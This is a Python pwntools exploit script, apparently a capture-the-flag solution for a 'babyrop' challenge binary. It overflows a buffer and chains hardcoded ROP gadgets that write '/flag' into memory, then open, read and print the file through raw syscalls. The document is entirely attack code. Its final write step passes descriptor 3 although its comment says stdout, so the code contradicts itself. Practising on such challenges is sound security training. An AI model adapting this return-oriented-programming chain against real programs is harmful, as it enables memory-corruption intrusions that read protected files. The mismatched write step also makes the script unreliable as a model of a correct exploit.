from pwn import *

context.log_level = 'debug'
offset = b'a'*88

#"/flag": 0x2f666c6167
flag =  [0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x00, 0x00]   
   
#.data = 0x404078
Data = 0x4040ff

#0x000000000040127b : add byte ptr [rcx], al ; pop rbp ; ret
add_rcx_al         = p64(0x40127b)



ret = p64(0x40101a)
poprax_ret          = p64(0x401c28)
poprdi_ret          = p64(0x401c60)
poprsi_ret          = p64(0x401c58)
poprdx_ret          = p64(0x401c38)
poprcx_ret          = p64(0x401c49)
syscall = p64(0x401c30)



payload = offset 
payload += ret


for i in range (8):
    payload += poprcx_ret
    payload += p64(Data + i)
    payload += poprax_ret
    payload += p64(flag[i])
    payload += add_rcx_al
    payload += p64(0)       #rbp



#open "/flag"
payload += poprax_ret
payload += p64(0x02)                    #open syscall
payload += poprdi_ret
payload += p64(Data)                    #pointer to string
payload += poprsi_ret
payload += p64(0)  
payload += syscall                     

#read "/flag" to somewhere in data region, buf
payload += poprax_ret
payload += p64(0)
payload += poprdi_ret
payload += p64(3)
payload += poprsi_ret
payload += p64(Data + 0xf)
payload += poprdx_ret
payload += p64(100)
payload += syscall

#write buf to stdout
payload += poprax_ret
payload += p64(0x1)
payload += poprdi_ret
payload += p64(3)
payload += poprsi_ret
payload += p64(Data + 0xf)
payload += poprdx_ret
payload += p64(100)
payload += syscall

r = process('/challenge/babyrop_level5.0')
r.recvuntil(b'Return Oriented Programming!\n')
r.sendline(payload)
r.interactive()